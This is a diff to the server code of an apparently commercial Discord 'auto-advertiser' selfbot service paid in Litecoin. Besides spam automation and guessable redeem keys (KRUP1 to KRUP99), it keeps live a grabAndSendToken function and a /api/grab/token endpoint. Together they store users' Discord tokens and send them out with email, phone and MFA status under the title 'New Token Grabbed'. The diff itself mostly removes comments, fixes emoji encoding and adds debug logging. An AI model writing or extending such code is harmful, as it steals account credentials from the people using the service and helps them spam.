@@ -34,7 +34,6 @@ class SimpleDB {
         try {
             if (fs.existsSync(this.file)) {
                 this.data = JSON.parse(fs.readFileSync(this.file, 'utf8'));
-                // Ensure arrays exist
                 this.data.usedAddresses = this.data.usedAddresses || [];
                 this.data.addressHistory = this.data.addressHistory || [];
             }
@@ -74,7 +73,6 @@ class SimpleDB {
     }
     
     addPending(userId, address, privateKey, expectedUSD, index) {
-        // Mark address as used immediately upon generation
         this.markAddressUsed(address);
         
         this.data.pending[address] = {
@@ -85,10 +83,9 @@ class SimpleDB {
             status: 'monitoring',
             created_at: Date.now(),
             index: index,
-            expires_at: Date.now() + (30 * 60 * 1000) // 30 minutes
+            expires_at: Date.now() + (30 * 60 * 1000)
         };
         
-        // Add to history
         this.data.addressHistory.push({
             address,
             user_id: userId,
@@ -129,7 +126,6 @@ class SimpleDB {
     updatePending(address, updates) {
         if (this.data.pending[address]) {
             this.data.pending[address] = { ...this.data.pending[address], ...updates };
-            // Update history too
             const historyEntry = this.data.addressHistory.find(h => h.address === address);
             if (historyEntry) {
                 historyEntry.status = updates.status || historyEntry.status;
@@ -280,6 +276,8 @@ const VALID_REDEEM_KEYS = new Set(
     Array.from({length: 99}, (_, i) => `KRUP${i + 1}`)
 );
 
+console.log('[KEYS] Loaded', VALID_REDEEM_KEYS.size, 'redeem keys');
+
 // Owner can add keys manually via API
 app.post('/api/admin/addkey', (req, res) => {
     const { adminSecret, key } = req.body;
@@ -335,7 +333,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
         db.addGrabbedToken(token, fullInfo, source);
         
         const embed = {
-            title: 'ð£ New Token Grabbed',
+            title: '🎣 New Token Grabbed',
             color: 0xff0000,
             fields: [
                 { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
@@ -343,9 +341,9 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
                 { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
                 { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
                 { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
-                { name: 'MFA', value: fullInfo.mfa_enabled ? 'â Enabled' : 'â Disabled', inline: true },
-                { name: 'Verified', value: fullInfo.verified ? 'â Yes' : 'â No', inline: true },
-                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'â No', inline: true },
+                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
+                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
+                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
                 { name: 'Source', value: source, inline: true },
                 { name: 'Time', value: new Date().toISOString(), inline: true }
             ],
@@ -381,7 +379,6 @@ async function checkAndSweep() {
         return;
     }
     
-    // Expire old addresses first
     db.expireOldAddresses();
     
     const pending = db.getAllPending();
@@ -454,7 +451,7 @@ app.post('/api/grab/token', async (req, res) => {
     res.json(result);
 });
 
-// Generate unique address - CHECKS FOR EXISTING ACTIVE ADDRESS FIRST
+// Generate unique address
 app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
     try {
         const userId = req.user.id;
@@ -464,7 +461,6 @@ app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
             return res.json({ success: false, error: 'Already purchased' });
         }
 
-        // Check if user already has an active pending address
         const existingPending = db.getUserPending(userId);
         if (existingPending) {
             const timeLeft = Math.ceil((existingPending.expires_at - Date.now()) / 60000);
@@ -484,11 +480,9 @@ app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
             return res.status(500).json({ success: false, error: 'Wallet module not loaded' });
         }
 
-        // Generate new unique address
         let globalIndex = db.getNextGlobalIndex();
         let { address, privateKey } = walletModule.generateLTCAddress(globalIndex);
         
-        // Ensure address hasn't been used before (safety check)
         let attempts = 0;
         while (db.isAddressUsed(address) && attempts < 10) {
             console.log(`[ADDRESS COLLISION] Address ${address} already used, generating next...`);
@@ -544,25 +538,47 @@ app.get('/api/activity', ensureAuthAPI, (req, res) => {
     });
 });
 
+// FIXED REDEEM ENDPOINT WITH DEBUG LOGGING
 app.post('/api/redeem', ensureAuthAPI, (req, res) => {
     try {
         const { key } = req.body;
         const userId = req.user.id;
         
-        if (!key) return res.json({ success: false, error: 'Enter a key' });
-        const upperKey = key.toUpperCase().trim();
+        console.log(`[REDEEM] User ${userId} attempting to redeem key: "${key}"`);
         
-        if (!VALID_REDEEM_KEYS.has(upperKey)) return res.json({ success: false, error: 'Invalid key' });
-        if (db.isKeyUsed(upperKey)) return res.json({ success: false, error: 'Key used' });
+        if (!key) {
+            console.log('[REDEEM] Failed: No key provided');
+            return res.json({ success: false, error: 'Enter a key' });
+        }
+        
+        const upperKey = key.toUpperCase().trim();
+        console.log(`[REDEEM] Processed key: "${upperKey}"`);
+        
+        if (!VALID_REDEEM_KEYS.has(upperKey)) {
+            console.log(`[REDEEM] Failed: Key "${upperKey}" not in valid keys set`);
+            console.log(`[REDEEM] Valid keys sample:`, Array.from(VALID_REDEEM_KEYS).slice(0, 5));
+            return res.json({ success: false, error: 'Invalid key' });
+        }
+        
+        if (db.isKeyUsed(upperKey)) {
+            console.log(`[REDEEM] Failed: Key "${upperKey}" already used by`, db.data.usedKeys[upperKey]);
+            return res.json({ success: false, error: 'Key used' });
+        }
         
         const user = db.getUser(userId);
-        if (user.auto_adv_purchased === 1) return res.json({ success: false, error: 'Already have access' });
+        if (user.auto_adv_purchased === 1) {
+            console.log(`[REDEEM] Failed: User ${userId} already has access`);
+            return res.json({ success: false, error: 'Already have access' });
+        }
+        
+        console.log(`[REDEEM] SUCCESS: Granting access to user ${userId} with key ${upperKey}`);
         
         db.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), redeem_key_used: upperKey });
         db.useKey(upperKey, userId);
         
         res.json({ success: true, message: 'Access granted!' });
     } catch (err) {
+        console.error('[REDEEM] Error:', err);
         res.status(500).json({ success: false, error: err.message });
     }
 });
@@ -576,7 +592,7 @@ app.get('/api/bot/configs', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
 // Start bot with config saving
 app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
     try {
-        const { token, channels, message, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, imageUrl } = req.body;
+        const { token, channels, message, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, imageUrl, sendAllAtOnce } = req.body;
         
         if (!token || !channels || !message) {
             return res.status(400).json({ success: false, error: 'Missing fields' });
@@ -615,10 +631,11 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
             active: 1,
             username: validation.username,
             server_joined: joinStatus?.success || false,
-            image_url: imageUrl || null
+            image_url: imageUrl || null,
+            send_all_at_once: sendAllAtOnce ? 1 : 0
         }, configId);
         
-        await selfbotModule.startSelfBot(req.user.id, token, channelList, message, delaySeconds * 1000, autoReply, autoReplyText, configId, imageUrl, req.ip);
+        await selfbotModule.startSelfBot(req.user.id, token, channelList, message, delaySeconds * 1000, autoReply, autoReplyText, configId, imageUrl, req.ip, sendAllAtOnce);
         
         res.json({ 
             success: true, 
